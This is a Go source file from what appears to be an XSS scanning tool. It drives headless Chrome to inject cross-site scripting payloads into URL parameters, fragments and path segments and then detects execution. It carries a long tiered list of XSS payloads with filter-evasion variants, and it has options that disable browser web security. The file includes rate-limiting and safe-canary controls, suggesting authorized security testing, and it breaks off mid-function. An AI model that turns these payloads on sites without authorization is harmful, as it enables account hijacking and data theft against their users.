package verifier

import (
	"context"
	"fmt"
	"net/url"
	"regexp"
	"sort"
	"strconv"
	"strings"
	"time"

	"github.com/Meco30701X/xssprobe/compliance"
	"github.com/Meco30701X/xssprobe/payloads"
	"github.com/Meco30701X/xssprobe/safety"
	"github.com/chromedp/cdproto/input"
	"github.com/chromedp/cdproto/page"
	"github.com/chromedp/chromedp"
)

// VerifyResult represents the result of a dynamic verification
type VerifyResult struct {
	Payload      string `json:"payload"`
	Source       string `json:"source"`
	Triggered    bool   `json:"triggered"`
	Error        bool   `json:"error,omitempty"`
	Detail       string `json:"detail"`
	Evidence     string `json:"evidence,omitempty"`
	CORSDisabled bool   `json:"cors_disabled,omitempty"` // Was CORS disabled during this test?
}

// AuthConfig holds authentication info for requests
type AuthConfig struct {
	Cookies    []string          // e.g. ["session=abc123", "token=xyz"]
	Headers    map[string]string // e.g. {"Authorization": "Bearer xxx"}
	Compliance *compliance.ComplianceContext
}

// Canary is a unique string used to detect if payload reaches the DOM
const Canary = "xXssCanary42x"

// VerificationConfig holds all verification configuration (thread-safe)
type VerificationConfig struct {
	Auth        *AuthConfig
	DisableCORS bool
	Proxy       string
	WAF         string
	Payload     *PayloadConfig
}

// PayloadConfig holds custom payload configuration (thread-safe)
type PayloadConfig struct {
	CustomPayloads []payloads.Payload
	CustomFirst    bool
	CustomOnly     bool
}

// NewPayloadConfig creates a new PayloadConfig
func NewPayloadConfig(custom []payloads.Payload, first bool) *PayloadConfig {
	return &PayloadConfig{
		CustomPayloads: custom,
		CustomFirst:    first,
	}
}

// getTestPayloads returns the payload strings to test
// If testAll is false, returns only high-success-rate payloads (default)
// If testAll is true, returns all payloads
func getTestPayloads(waf string, config *PayloadConfig, testAll bool) []string {
	var result []string
	if config != nil && config.CustomOnly {
		for _, p := range config.CustomPayloads {
			result = append(result, p.Value)
		}
		return result
	}

	// Add custom payloads first if configured
	if config != nil && len(config.CustomPayloads) > 0 && config.CustomFirst {
		for _, p := range config.CustomPayloads {
			result = append(result, p.Value)
		}
	}

	// Always include canary payloads
	for _, p := range payloads.GetCanaryPayloads(Canary) {
		result = append(result, p.Value)
	}

	if testAll {
		// Test all payloads
		if waf != "" {
			for _, p := range payloads.GetPayloadsByWAF(waf) {
				result = append(result, p.Value)
			}
		} else {
			base := payloads.GetBasePayloads()
			for _, p := range base {
				result = append(result, p.Value)
			}
		}
	} else {
		// Default: only high-success-rate payloads
		highRate := []string{
			// === Tier 1: Basic injection (most likely to work) ===
			`<script>alert(1)</script>`,
			`"><script>alert(1)</script>`,
			`'><script>alert(1)</script>`,
			`<img src=x onerror=alert(1)>`,
			`"><img src=x onerror=alert(1)>`,
			`<svg onload=alert(1)>`,
			`"><svg onload=alert(1)>`,

			// === Tier 2: JavaScript context (no <> needed) ===
			`alert(1)`,
			`'-alert(1)-'`,
			`"-alert(1)-"`,
			`${alert(1)}`,
			`;alert(1);`,
			`"-alert(1)"`,
			`'-alert(1)'`,

			// === Tier 3: Attribute breakout (no <> needed) ===
			`" onmouseover="alert(1)`,
			`' onmouseover='alert(1)`,
			`" autofocus onfocus="alert(1)`,
			`" onclick="alert(1)`,
			`" onfocus=alert(1) autofocus="`,

			// === Tier 4: Protocol handlers ===
			`javascript:alert(1)`,
			`javascript:void(alert(1))`,
			`data:text/html,<script>alert(1)</script>`,
			`data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==`,

			// === Tier 5: Encoding bypass ===
			`&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;`,
			`%3Cscript%3Ealert(1)%3C/script%3E`,
			`&#60;script&#62;alert(1)&#60;/script&#62;`,

			// === Tier 6: Alternative syntax ===
			`<img/src=x/onerror=alert(1)>`,
			`<svg/onload=alert(1)>`,
			`<script>alert(1)//`,
			`<ScRiPt>alert(1)</sCrIpT>`,
			`<IMG SRC=x ONERROR=alert(1)>`,
			`<img src=x onerror=alert(1)//`,
			`<svg onload=alert(1)//`,

			// === Tier 7: Template literal (no parentheses) ===
			"<script>alert`1`</script>",
			"<img src=x onerror=alert`1`>",
			"<svg onload=alert`1`>",
			`<script>alert&#40;1&#41;</script>`,

			// === Tier 8: Alternative functions ===
			`<script>confirm(1)</script>`,
			`<script>prompt(1)</script>`,
			`<img src=x onerror=confirm(1)>`,
			`<img src=x onerror=prompt(1)>`,
			`<svg onload=confirm(1)>`,
			`<svg onload=prompt(1)>`,

			// === Tier 9: String concatenation (bypass keyword filter) ===
			`<script>window['al'+'ert'](1)</script>`,
			`<script>top['al'+'ert'](1)</script>`,
			`<script>self['al'+'ert'](1)</script>`,
			`<script>this['al'+'ert'](1)</script>`,
			`<script>parent['al'+'ert'](1)</script>`,
			`<img src=x onerror=window['al'+'ert'](1)>`,
			`<img src=x onerror=top['al'+'ert'](1)>`,
			`<img src=x onerror=self['al'+'ert'](1)>`,
			`<svg onload=window['al'+'ert'](1)>`,
			`<svg onload=top['al'+'ert'](1)>`,

			// === Tier 10: Hex/Unicode encoding ===
			`<script>window['\x61\x6c\x65\x72\x74'](1)</script>`,
			`<script>window[String.fromCharCode(97,108,101,114,116)](1)</script>`,
			`<img src=x onerror=window['\x61\x6c\x65\x72\x74'](1)>`,
			`<img src=x onerror=window[String.fromCharCode(97,108,101,114,116)](1)>`,

			// === Tier 11: Optional chaining (modern JS) ===
			`globalThis?.alert?.(1)`,
			`self?.alert?.(1)`,
			`top?.alert?.(1)`,
			`window?.alert?.(1)`,

			// === Tier 12: Array methods ===
			`<img src=x onerror=[1].find(alert)>`,
			`<img src=x onerror=[1].map(alert)>`,
			`<img src=x onerror=[1].some(alert)>`,

			// === Tier 13: Alternative tags ===
			`<details open ontoggle=alert(1)>`,
			`<body onload=alert(1)>`,
			`<video src=x onerror=alert(1)>`,
			`<audio src=x onerror=alert(1)>`,
			`<marquee onstart=alert(1)>`,
			`<input onfocus=alert(1) autofocus>`,
			`<select onchange=alert(1)><option>1</option><option>2</option></select>`,
			`<textarea onfocus=alert(1) autofocus>`,
			`<iframe src=javascript:alert(1)>`,
			`<object data=javascript:alert(1)>`,
			`<embed src=javascript:alert(1)>`,
			`<a href=javascript:alert(1)>click</a>`,
			`<form onsubmit=alert(1)><input type=submit></form>`,
			`<video oncanplay=alert(1)><source src=x>`,
			`<audio onplay=alert(1)><source src=x>`,
			`<svg><animate onbegin=alert(1) attributeName=x dur=1s>`,
			`<svg><set onbegin=alert(1) attributename=x to=1>`,

			// === Tier 14: Tab/newline injection ===
			"<img src=x\tonerror=alert(1)>",
			"<img src=x\nonerror=alert(1)>",
			"<svg\nonload=alert(1)>",
			"<svg\tonload=alert(1)>",

			// === Tier 15: HTMX events ===
			`<img src=x hx-on:htmx:load='alert(1)'>`,
			`<div hx-on:click='alert(1)'>click</div>`,

			// === Tier 16: Clipboard/drag events ===
			`<input onpaste=alert(1)>`,
			`<div draggable ondragstart=alert(1)>drag</div>`,
		}
		result = append(result, highRate...)

		// Add WAF-specific payloads if WAF detected
		if waf != "" {
			wafPayloads := payloads.GetPayloadsByWAF(waf)
			limit := 5
			if len(wafPayloads) < limit {
				limit = len(wafPayloads)
			}
			for i := 0; i < limit; i++ {
				result = append(result, wafPayloads[i].Value)
			}
		}
	}

	// Add custom payloads last if not first
	if config != nil && len(config.CustomPayloads) > 0 && !config.CustomFirst {
		for _, p := range config.CustomPayloads {
			result = append(result, p.Value)
		}
	}

	return result
}

// getHashTestPayloads keeps hash-source coverage across the main executable
// contexts without replaying every query-string payload as a fragment too.
func getHashTestPayloads(config *PayloadConfig) []string {
	var result []string
	seen := make(map[string]bool)
	appendUnique := func(value string) {
		if value != "" && !seen[value] {
			seen[value] = true
			result = append(result, value)
		}
	}
	if config != nil && config.CustomOnly {
		for _, p := range config.CustomPayloads {
			appendUnique(p.Value)
		}
		return result
	}
	if config != nil && config.CustomFirst {
		for _, p := range config.CustomPayloads {
			appendUnique(p.Value)
		}
	}

	canaries := payloads.GetCanaryPayloads(Canary)
	for _, contextType := range []payloads.Context{
		payloads.ContextHTML,
		payloads.ContextAttr,
		payloads.ContextJS,
		payloads.ContextTemplate,
	} {
		for _, p := range canaries {
			if p.Context == contextType && strings.Contains(p.Value, "window.xssTriggered=true") {
				appendUnique(p.Value)
				break
			}
		}
	}
	if config != nil && !config.CustomFirst {
		for _, p := range config.CustomPayloads {
			appendUnique(p.Value)
		}
	}
	return result
}

// getTestPayloadsByContext returns payloads selected by injection context and WAF
func getTestPayloadsByContext(contextType string, waf string, config *PayloadConfig) []string {
	var result []string
	if config != nil && config.CustomOnly {
		for _, p := range config.CustomPayloads {
			result = append(result, p.Value)
		}
		return result
	}

	// Always include canary payloads
	for _, p := range payloads.GetCanaryPayloads(Canary) {
		result = append(result, p.Value)
	}

	// Map context to payload contexts
	var targetContexts []payloads.Context
	switch contextType {
	case "html", "comment":
		targetContexts = []payloads.Context{payloads.ContextHTML}
	case "attribute":
		targetContexts = []payloads.Context{payloads.ContextAttr, payloads.ContextHTML}
	case "js-string":
		targetContexts = []payloads.Context{payloads.ContextJS, payloads.ContextJSVar}
	case "js-code":
		targetContexts = []payloads.Context{payloads.ContextHTML, payloads.ContextJS}
	case "url":
		targetContexts = []payloads.Context{payloads.ContextURL, payloads.ContextHTML}
	case "css":
		targetContexts = []payloads.Context{payloads.ContextCSS, payloads.ContextHTML}
	default:
		targetContexts = []payloads.Context{payloads.ContextHTML, payloads.ContextAttr, payloads.ContextJS}
	}

	// Get context-specific payloads
	if waf != "" {
		// Get WAF payloads
		wafPayloads := payloads.GetPayloadsByWAF(waf)
		for _, p := range wafPayloads {
			result = append(result, p.Value)
		}
	}

	// Add context-specific payloads
	contextPayloads := payloads.GetPayloadsByContexts(targetContexts)
	limit := 15
	if len(contextPayloads) < limit {
		limit = len(contextPayloads)
	}
	for i := 0; i < limit; i++ {
		result = append(result, contextPayloads[i].Value)
	}

	return result
}

// newChromeContext creates a chromedp context with optional auth config
func newChromeContext(ctx context.Context, targetURL string, auth *AuthConfig, limiter *compliance.RateLimiter, disableCORS bool, proxy string) (context.Context, context.CancelFunc, error) {
	opts := append(chromedp.DefaultExecAllocatorOptions[:],
		chromedp.Flag("headless", true),
		chromedp.Flag("disable-gpu", true),
		chromedp.Flag("no-sandbox", true),
	)
	if disableCORS {
		opts = append(opts, chromedp.Flag("disable-web-security", true))
	}
	if proxy != "" {
		opts = append(opts, chromedp.Flag("proxy-server", proxy))
	}

	allocCtx, allocCancel := chromedp.NewExecAllocator(ctx, opts...)
	taskCtx, taskCancel := chromedp.NewContext(allocCtx)
	var cookies []string
	var headers map[string]string
	var checks *compliance.ComplianceContext
	if auth != nil {
		cookies, headers, checks = auth.Cookies, auth.Headers, auth.Compliance
	}
	// Fetch interception requires an initialized target session. Starting the
	// browser first avoids "invalid context" from Fetch.enable before the first
	// chromedp action has created the target.
	if err := chromedp.Run(taskCtx, chromedp.Navigate("about:blank")); err != nil {
		taskCancel()
		allocCancel()
		return nil, nil, fmt.Errorf("browser startup failed: %w", err)
	}
	if err := compliance.InstallBrowserPolicy(taskCtx, targetURL, cookies, headers, checks, limiter); err != nil {
		taskCancel()
		allocCancel()
		return nil, nil, err
	}

	combinedCancel := func() {
		taskCancel()
		allocCancel()
	}

	return taskCtx, combinedCancel, nil
}

// VerifyURL tests a URL for reflected DOM XSS
func VerifyURL(targetURL string, auth *AuthConfig, waf string, limiter *compliance.RateLimiter, config *PayloadConfig, maxConfirm int, testAll bool, disableCORS bool, proxy string) []VerifyResult {
	// Default parameters for backward compatibility
	defaultParams := []string{"q", "search", "id", "page", "input", "name", "s"}
	return VerifyURLWithParams(targetURL, auth, waf, defaultParams, limiter, config, maxConfirm, testAll, disableCORS, proxy)
}

// countConfirmed counts how many results are confirmed
func countConfirmed(results []VerifyResult) int {
	count := 0
	for _, r := range results {
		if r.Triggered {
			count++
		}
	}
	return count
}

// VerifyURLWithParams tests a URL for reflected DOM XSS with custom parameters
func VerifyURLWithParams(targetURL string, auth *AuthConfig, waf string, params []string, limiter *compliance.RateLimiter, config *PayloadConfig, maxConfirm int, testAll bool, disableCORS bool, proxy string) []VerifyResult {
	var results []VerifyResult
	testPayloads := getTestPayloads(waf, config, testAll)
	hashPayloads := getHashTestPayloads(config)

	if len(params) == 0 {
		params = []string{"q", "search", "id", "page", "input", "name", "s"}
	}
	params = includeTargetURLParams(targetURL, params)

	hashIndex := 0
	if len(hashPayloads) > 0 {
		// Test a representative HTML canary first so hash-only DOM XSS can stop
		// early; test other contexts only if parameter payloads do not confirm.
		r := testHash(targetURL, hashPayloads[0], auth, limiter, disableCORS, proxy)
		results = append(results, r)
		if r.Error {
			return results
		}
		if maxConfirm > 0 && countConfirmed(results) >= maxConfirm {
			return results
		}
		hashIndex = 1
	}

	for _, payload := range testPayloads {
		// Test each parameter
		for _, param := range params {
			r := testSearchParam(targetURL, param, payload, auth, limiter, disableCORS, proxy)
			results = append(results, r)
			if r.Error {
				return results
			}
			if maxConfirm > 0 && countConfirmed(results) >= maxConfirm {
				return results
			}
		}
	}

	for _, payload := range hashPayloads[hashIndex:] {
		r := testHash(targetURL, payload, auth, limiter, disableCORS, proxy)
		results = append(results, r)
		if r.Error || (maxConfirm > 0 && countConfirmed(results) >= maxConfirm) {
			return results
		}
	}

	return results
}

// VerifyURLWithContext tests a URL with context-aware payload selection
func VerifyURLWithContext(targetURL string, auth *AuthConfig, waf string, paramContexts map[string]string, limiter *compliance.RateLimiter, config *PayloadConfig, maxConfirm int, testAll bool, disableCORS bool, proxy string) []VerifyResult {
	var results []VerifyResult
	paramContexts = includeTargetURLParamContexts(targetURL, paramContexts)

	// Test hash fragment with default payloads
	testPayloads := getTestPayloads(waf, config, testAll)
	hashPayloads := getHashTestPayloads(config)
	for _, payload := range hashPayloads[:min(1, len(hashPayloads))] {
		r := testHash(targetURL, payload, auth, limiter, disableCORS, proxy)
		results = append(results, r)
		if r.Error {
			return results
		}
		if maxConfirm > 0 && countConfirmed(results) >= maxConfirm {
			return results
		}
	}

	// Test parameters deterministically so results do not vary between runs.
	paramNames := make([]string, 0, len(paramContexts))
	for param := range paramContexts {
		paramNames = append(paramNames, param)
	}
	sort.Strings(paramNames)
	for _, param := range paramNames {
		ctxType := paramContexts[param]
		// Get context-specific payloads
		contextPayloads := getTestPayloadsByContext(ctxType, waf, config)
		if len(contextPayloads) == 0 {
			contextPayloads = testPayloads[:min(10, len(testPayloads))]
		}

		fmt.Printf("    Testing '%s' (context: %s) with %d payloads\n", param, ctxType, len(contextPayloads))

		for _, payload := range contextPayloads {
			r := testSearchParam(targetURL, param, payload, auth, limiter, disableCORS, proxy)
			results = append(results, r)
			if r.Error {
				return results
			}
			if maxConfirm > 0 && countConfirmed(results) >= maxConfirm {
				return results
			}
		}
	}

	for _, payload := range hashPayloads[min(1, len(hashPayloads)):] {
		r := testHash(targetURL, payload, auth, limiter, disableCORS, proxy)
		results = append(results, r)
		if r.Error || (maxConfirm > 0 && countConfirmed(results) >= maxConfirm) {
			return results
		}
	}

	return results
}

func testHash(baseURL, payload string, auth *AuthConfig, limiter *compliance.RateLimiter, disableCORS bool, proxy string) VerifyResult {
	result := VerifyResult{Payload: payload, Source: "hash", CORSDisabled: disableCORS}
	testURL := withURLFragment(baseURL, payload)

	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()

	taskCtx, taskCancel, setupErr := newChromeContext(ctx, testURL, auth, limiter, disableCORS, proxy)
	if setupErr != nil {
		result.Error = true
		result.Detail = "browser policy setup failed: " + setupErr.Error()
		return result
	}
	defer taskCancel()

	chromedp.ListenTarget(taskCtx, func(ev interface{}) {
		if _, ok := ev.(*page.EventJavascriptDialogOpening); ok {
			result.Triggered = true
			result.Evidence = "execution"
			result.Detail = "alert() dialog triggered"
		}
	})

	var domContent string
	var jsTriggered bool

	err := chromedp.Run(taskCtx,
		chromedp.Navigate(testURL),
		chromedp.Sleep(2*time.Second),
		chromedp.Evaluate(`window.xssTriggered || false`, &jsTriggered),
	)

	if err != nil {
		// Check if alert was triggered before the error
		if result.Triggered {
			// alert() was triggered - this is a confirmed XSS
			return result
		}
		result.Detail = "navigation error: " + err.Error()
		result.Error = true
		return result
	}
	// A hashchange handler does not run when a page first loads with a fragment.
	// Toggle to a harmless sentinel and back to the canary to exercise both
	// on-load hash readers and hashchange listeners.
	if !jsTriggered && !result.Triggered {
		var ignored interface{}
		fragment := "#" + escapedFragment(payload)
		err = chromedp.Run(taskCtx,
			chromedp.Evaluate(`window.location.hash = `+strconv.Quote("#xssprobe-hash-toggle"), &ignored),
			chromedp.Sleep(100*time.Millisecond),
			chromedp.Evaluate(`window.location.hash = `+strconv.Quote(fragment), &ignored),
			chromedp.Sleep(500*time.Millisecond),
			chromedp.Evaluate(`window.xssTriggered || false`, &jsTriggered),
		)
		if err != nil {
			result.Error = true
			result.Detail = "hashchange verification failed: " + err.Error()
			return result
		}
	}
	err = chromedp.Run(taskCtx, chromedp.InnerHTML("html", &domContent))
	if err != nil {
		result.Error = true
		result.Detail = "failed to inspect rendered DOM: " + err.Error()
		return result
	}

	if jsTriggered {
		result.Triggered = true
		result.Evidence = "execution"
		result.Detail = "JavaScript execution confirmed (window.xssTriggered=true)"
	} else if result.Triggered {
		// alert() dialog was triggered - already set by event listener
	} else if strings.Contains(domContent, Canary) {
		if isCanaryExecutable(domContent, Canary) {
			result.Detail = "Canary reached a potential executable context; execution was not observed"
			result.Evidence = "executable_context"
		} else {
			result.Triggered = false
			result.Detail = "Input reflected but not in executable position"
			result.Evidence = "reflected"
		}
	}
	if result.Detail == "" {
		result.Detail = "No JavaScript execution observed"
		result.Evidence = "no_execution"
	}

	return result
}

// withURLFragment sets a fragment using URL fragment escaping. QueryEscape is
// incorrect here because it encodes spaces as '+', which decodeURIComponent
// in hash consumers does not turn back into spaces.
func withURLFragment(rawURL, fragment string) string {
	parsed, err := url.Parse(rawURL)
	if err != nil {
		return rawURL + "#" + escapedFragment(fragment)
	}
	parsed.Fragment = fragment
	parsed.RawFragment = ""
	return parsed.String()
}

// withPathSuffix appends a test payload to the last path segment while keeping
// the URL's existing query and fragment. Path testing is opt-in because it can
// change route matching and may exercise different application handlers.
func withPathSuffix(rawURL, payload string) (string, error) {
	parsed, err := url.Parse(rawURL)
	if err != nil || (parsed.Scheme != "http" && parsed.Scheme != "https") || parsed.Hostname() == "" {
		return "", fmt.Errorf("invalid path-test URL")
	}
	escapedPath := parsed.EscapedPath()
	lastSlash := strings.LastIndex(escapedPath, "/")
	prefix := escapedPath[:lastSlash+1]
	lastEscaped := escapedPath[lastSlash+1:]
	prefixPath, err := url.PathUnescape(prefix)
	if err != nil {
		return "", fmt.Errorf("invalid escaped path prefix")
	}
	lastSegment, err := url.PathUnescape(lastEscaped)
	if err != nil {
		return "", fmt.Errorf("invalid escaped final path segment")
	}
	parsed.Path = prefixPath + lastSegment + payload
	parsed.RawPath = prefix + url.PathEscape(lastSegment+payload)
	return parsed.String(), nil
}

// VerifyPathSegment tests the last URL path segment for reflected execution.
// It is opt-in at the CLI because changing a path can exercise a different
// handler; it never submits form or stored data.
func VerifyPathSegment(targetURL string, auth *AuthConfig, waf string, limiter *compliance.RateLimiter, config *PayloadConfig, maxConfirm int, testAll bool, disableCORS bool, proxy string) []VerifyResult {
	results := make([]VerifyResult, 0)
	for _, payload := range getTestPayloads(waf, config, testAll) {
		result := testPathSuffix(targetURL, payload, auth, limiter, disableCORS, proxy)
		results = append(results, result)
		if result.Error || (maxConfirm > 0 && countConfirmed(results) >= maxConfirm) {
			return results
		}
	}
	return results
}

func testPathSuffix(baseURL, payload string, auth *AuthConfig, limiter *compliance.RateLimiter, disableCORS bool, proxy string) VerifyResult {
	result := VerifyResult{Source: "path-segment", Payload: payload, CORSDisabled: disableCORS}
	testURL, err := withPathSuffix(baseURL, payload)
	if err != nil {
		result.Error = true
		result.Detail = err.Error()
		return result
	}

	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()
	taskCtx, taskCancel, setupErr := newChromeContext(ctx, testURL, auth, limiter, disableCORS, proxy)
	if setupErr != nil {
		result.Error = true
		result.Detail = "browser policy setup failed: " + setupErr.Error()
		return result
	}
	defer taskCancel()

	chromedp.ListenTarget(taskCtx, func(ev interface{}) {
		if _, ok := ev.(*page.EventJavascriptDialogOpening); ok {
			result.Triggered = true
			result.Evidence = "execution"
			result.Detail = "alert() dialog triggered"
		}
	})

	var jsTriggered bool
	err = chromedp.Run(taskCtx,
		chromedp.Navigate(testURL),
		chromedp.Sleep(500*time.Millisecond),
		chromedp.Evaluate(`window.xssTriggered === true`, &jsTriggered),
	)
	if err != nil {
		if result.Triggered {
			return result
		}
		result.Error = true
		result.Detail = "navigation error: " + err.Error()
		return result
	}
	if jsTriggered {
		result.Triggered = true
		result.Evidence = "execution"
		result.Detail = "JavaScript execution confirmed (window.xssTriggered=true)"
	} else {
		result.Detail = "No JavaScript execution observed in the modified path"
		result.Evidence = "no_execution"
	}
	return result
}

func escapedFragment(fragment string) string {
	parsed := url.URL{Fragment: fragment}
	return parsed.EscapedFragment()
}

func testSearchParam(baseURL, param, payload string, auth *AuthConfig, limiter *compliance.RateLimiter, disableCORS bool, proxy string) VerifyResult {
	result := VerifyResult{Payload: payload, Source: "search:" + param, CORSDisabled: disableCORS}

	parsedURL, err := url.Parse(baseURL)
	if err != nil {
		result.Error = true
		result.Detail = "invalid URL"
		return result
	}

	q := parsedURL.Query()
	q.Set(param, payload)
	parsedURL.RawQuery = q.Encode()
	testURL := parsedURL.String()

	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()

	taskCtx, taskCancel, setupErr := newChromeContext(ctx, testURL, auth, limiter, disableCORS, proxy)
	if setupErr != nil {
		result.Error = true
		result.Detail = "browser policy setup failed: " + setupErr.Error()
		return result
	}
	defer taskCancel()

	chromedp.ListenTarget(taskCtx, func(ev interface{}) {
		if _, ok := ev.(*page.EventJavascriptDialogOpening); ok {
			result.Triggered = true
			result.Evidence = "execution"
			result.Detail = "alert() dialog triggered"
		}
	})

	var domContent string
	var jsTriggered bool
	focusStatus := ""

	err = chromedp.Run(taskCtx,
		chromedp.Navigate(testURL),
		chromedp.Sleep(2*time.Second),
		chromedp.Evaluate(`window.xssTriggered || false`, &jsTriggered),
	)

	if err != nil {
		// Check if alert was triggered before the error
		if result.Triggered {
			// alert() was triggered - this is a confirmed XSS
			return result
		}
		result.Detail = "navigation error: " + err.Error()
		result.Error = true
		return result
	}
	if !jsTriggered && !result.Triggered {
		clickTarget, safeClick := safeClickCanaryTarget(payload)
		if safeClick {
			var clicked bool
			var ignored interface{}
			clickScript := `(()=>{const expected=` + strconv.Quote(clickTarget) + `;const link=[...document.querySelectorAll('a[href]')].find(a=>(a.getAttribute('href')||'').trim()===expected);if(!link)return false;link.click();return true})()`
			if err = chromedp.Run(taskCtx,
				chromedp.Evaluate(clickScript, &clicked),
				chromedp.Sleep(150*time.Millisecond),
				chromedp.Evaluate(`window.xssTriggered || false`, &jsTriggered),
			); err != nil {
				result.Error = true
				result.Detail = "safe link activation failed: " + err.Error()
				return result
			}
			_ = ignored
			if clicked && jsTriggered {
				result.Triggered = true
				result.Evidence = "execution"
				result.Detail = "JavaScript execution confirmed after activating marker-only javascript link"
			}
		}
	}
	if !jsTriggered && !result.Triggered && safeFocusCanary(payload) {
		expectedHandler := "window.xssTriggered=true/*" + Canary + "*/"
		var focusState struct {
			Found   bool `json:"found"`
			Focused bool `json:"focused"`
			Marker  bool `json:"marker"`
		}
		focusScript := `(()=>{const expected=` + strconv.Quote(expectedHandler) + `;const el=[...document.querySelectorAll('[onfocus]')].find(node=>node.getAttribute('onfocus')===expected);if(!el)return {found:false,focused:false,marker:false};if(document.activeElement===el)el.blur();el.focus();if(!window.xssTriggered)el.dispatchEvent(new FocusEvent('focus'));return {found:true,focused:document.activeElement===el,marker:window.xssTriggered===true}})()`
		if err = chromedp.Run(taskCtx, chromedp.Evaluate(focusScript, &focusState)); err != nil {
			result.Error = true
			result.Detail = "safe focus canary failed: " + err.Error()
			return result
		}
		jsTriggered = focusState.Marker
		if !focusState.Found {
			focusStatus = "safe focus canary matched but no element had the exact marker-only handler"
		} else if !focusState.Marker {
			focusStatus = fmt.Sprintf("safe focus target found=%t focused=%t, but the marker did not execute", focusState.Found, focusState.Focused)
		}
		if focusState.Marker {
			result.Triggered = true
			result.Evidence = "execution"
			result.Detail = "JavaScript execution confirmed after focusing the exact marker-only event handler"
		}
	}
	if !jsTriggered && !result.Triggered {
		if attribute, handler, ok := safeHoverCanaryExact(payload); ok {
			var position []float64
			findScript := `(()=>{const attr=` + strconv.Quote(attribute) + `;const expected=` + strconv.Quote(handler) + `;const el=[...document.querySelectorAll('['+attr+']')].find(node=>node.getAttribute(attr)===expected);if(!el)return null;const r=el.getBoundingClientRect();if(!r.width||!r.height)return null;return [r.left+r.width/2,r.top+r.height/2]})()`
			if err = chromedp.Run(taskCtx, chromedp.Evaluate(findScript, &position)); err != nil {
				result.Error = true
				result.Detail = "safe hover target lookup failed: " + err.Error()
				return result
			}
			if len(position) == 2 {
				err = chromedp.Run(taskCtx,
					chromedp.ActionFunc(func(actionCtx context.Context) error {
						return input.DispatchMouseEvent(input.MouseMoved, position[0], position[1]).Do(actionCtx)
					}),
					chromedp.Sleep(100*time.Millisecond),
					chromedp.Evaluate(`window.xssTriggered || false`, &jsTriggered),
				)
				if err != nil {
					result.Error = true
					result.Detail = "safe hover canary failed: " + err.Error()
					return result
				}
				if jsTriggered {
					result.Triggered = true
					result.Evidence = "execution"
					result.Detail = "JavaScript execution confirmed after hovering the exact marker-only event handler"
				}
			}
		}
	}
	err = chromedp.Run(taskCtx, chromedp.InnerHTML("html", &domContent))
	if err != nil {
		result.Error = true
		result.Detail = "failed to inspect rendered DOM: " + err.Error()
		return result
	}

	if jsTriggered {
		result.Triggered = true
		result.Evidence = "execution"
		result.Detail = "JavaScript execution confirmed (window.xssTriggered=true)"
	} else if result.Triggered {
		// alert() dialog was triggered - already set by event listener
		// Keep existing detail
	} else if strings.Contains(domContent, Canary) {
		// Canary found in DOM - but is it in an executable position?
		// Check if canary is inside <script> tags or event handlers
		if isCanaryExecutable(domContent, Canary) {
			result.Detail = "Canary reached a potential executable context; execution was not observed"
			result.Evidence = "executable_context"
		} else {
			// Canary is just reflected text, not executable XSS
			result.Triggered = false
			result.Detail = "Input reflected but not in executable position"
			result.Evidence = "reflected"
		}
	}
	if result.Detail == "" {
		result.Detail = "No JavaScript execution observed"
		result.Evidence = "no_execution"
	}
	if focusStatus != "" && !result.Triggered {
		result.Detail = focusStatus
		result.Evidence = "focus_not_executed"
	}

	return result
}

// isCanaryExecutable checks if the canary is in a position where it can execute JavaScript
func isCanaryExecutable(domContent, canary string) bool {
	// Check if canary is inside <script> tags
	// Pattern: <script>...canary...</script>
	scriptPattern := regexp.MustCompile(`(?i)<script[^>]*>.*?` + regexp.QuoteMeta(canary) + `.*?</script>`)
	if scriptPattern.MatchString(domContent) {
		return true
	}

	// Check if canary is inside event handler attributes (on*)
	// Pattern: on*="...canary..."
	eventPattern := regexp.MustCompile(`(?i)\bon\w+\s*=\s*["'][^"']*` + regexp.QuoteMeta(canary) + `[^"']*["']`)
	if eventPattern.MatchString(domContent) {
		return true
	}

	// Check if canary is inside javascript: URLs
	// Pattern: href="javascript:...canary..." or src="javascript:..."
	jsURLPattern := regexp.MustCompile(`(?i)(?:href|src|action)\s*=\s*["']javascript:[^"']*` + regexp.QuoteMeta(canary) + `[^"']*["']`)
	if jsURLPattern.MatchString(domContent) {
		return true
	}

	// Check if canary is inside style attributes with expression()
	// Pattern: style="...expression(canary)..."
	stylePattern := regexp.MustCompile(`(?i)style\s*=\s*["'][^"']*expression\s*\([^)]*` + regexp.QuoteMeta(canary) + `[^)]*\)[^"']*["']`)
	if stylePattern.MatchString(domContent) {
		return true
	}

	return false
}

// isSafeClickCanary permits automatic activation only for the exact
// JavaScript URL used by controlled labs to set our in-page marker. Arbitrary
// javascript: payloads are never clicked by the verifier.
func isSafeClickCanary(payload string) bool {
	_, ok := safeClickCanaryTarget(payload)
	return ok
}

func safeClickCanaryTarget(payload string) (string, bool) {
	want := "javascript:window.xssTriggered=true/*" + Canary + "*/"
	if strings.EqualFold(strings.TrimSpace(payload), want) {
		return want, true
	}
	for _, wrapper := range []struct{ prefix, suffix string }{
		{`<a href=`, `>x</a>`},
		{`<a href="`, `">x</a>`},
		{`<a href='`, `'>x</a>`},
	} {
		if strings.EqualFold(payload, wrapper.prefix+want+wrapper.suffix) {
			return want, true
		}
	}
	return "", false
}

func safeFocusCanary(payload string) bool {
	expectedHandler := "window.xssTriggered=true/*" + Canary + "*/"
	return payload == "x\" autofocus onfocus=\""+expectedHandler
}

func safeHoverCanaryExact(payload string) (attribute, handler string, ok bool) {
	handler = "window.xssTriggered=true/*" + Canary + "*/"
	for _, candidate := range []string{"onmouseover", "onmouseenter", "onpointerenter"} {
		expected := "x\" " + candidate + "=\"" + handler + "\" x=\""
		if payload == expected {
			return candidate, handler, true
		}
	}
	return "", "", false
}

func safeHoverCanary(payload string) (attribute, handler string, ok bool) {
	handler = "window.xssTriggered=true/*" + Canary + "*/"
	for _, candidate := range []string{"onmouseover", "onmouseenter", "onpointerenter"} {
		if payload == `x" `+candidate+`="`+handler+`" x="` {
			return candidate, handler, true
		}
	}
	return "", "", false
}

// VerifyStoredXSS tests for stored DOM XSS with safety controls
func VerifyStoredXSS(targetURL string, auth *AuthConfig, waf string, safetyMode *safety.SafetyMode, limiter *compliance.RateLimiter, disableCORS bool, proxy string) ([]VerifyResult, bool) {
	var results []VerifyResult

	// Safety: print configuration
	safety.PrintSafetyInfo(safetyMode)

